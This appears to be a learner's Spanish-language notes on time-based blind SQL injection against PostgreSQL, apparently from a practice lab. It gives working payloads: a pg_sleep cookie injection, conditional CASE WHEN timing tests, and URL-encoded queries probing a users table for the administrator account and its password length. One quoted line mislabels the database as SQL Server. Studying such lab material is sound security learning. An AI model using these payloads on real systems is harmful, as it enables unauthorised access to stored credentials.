# Blind SQL injection with time delays

Se puede inyectar codigo con delays de tiempo cambia mucho para cada base de datos

> Las técnicas para desencadenar un retraso de tiempo son muy específicas para el tipo de base de datos que se utiliza. En Microsoft SQL Server, una entrada como la siguiente se puede usar para probar una condición y desencadenar un retraso dependiendo de si la expresión es verdadera:


```
TrackingId=x'||pg_sleep(10)--

```


# Blind SQL injection with time delays and information retrieval 

# Checar si el vulnerable al Ataque Paso 1

Para probar si es vulnerable a este tipo de ataque se pueden utilizar los condicionales

```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
'SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

# Orden de ejecucion en SQL Paso 2 ( para probar existencia de tablas)

> https://programacion.net/articulo/el_orden_de_ejecucion_de_las_queries_en_sql_1032

El orden en que se ejecuta una sentencia SQL nos puede ayudar a checar si existen usuarios y tablas. La siguiente tabla muentra como se va ejecutando una sentencia SQL la primera intruccion que se ejecuta es el from

## Logical Query Processing Phase

Cuando escribes una serie de comandos dentro de una query sql, estos comandos se dividen mediante una fase de procesamiento lógico. Cada fase genera una serie de tablas virtuales que alimentan a la siguiente fase. Por supuesto, dichas tablas virtuales no son visibles por los administradores. Las fases y su orden de ejecución son las siguiente

```
1. FROM
2. ON
3. OUTER
4. WHERE
5. GROUP BY
6. CUBE | ROLLUP
7. HAVING
8. SELECT
9. DISTINCT
10 ORDER BY
11. TOP
```


## Checar Tablas y Sacar informacion 

```
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Por el Orden de ejecucion

```

'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END from users where username='administrator'--;

```

# Extraer los datos Paso 3

Sabiendo que tienemos un password utilizamos el LENGTH()

```
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
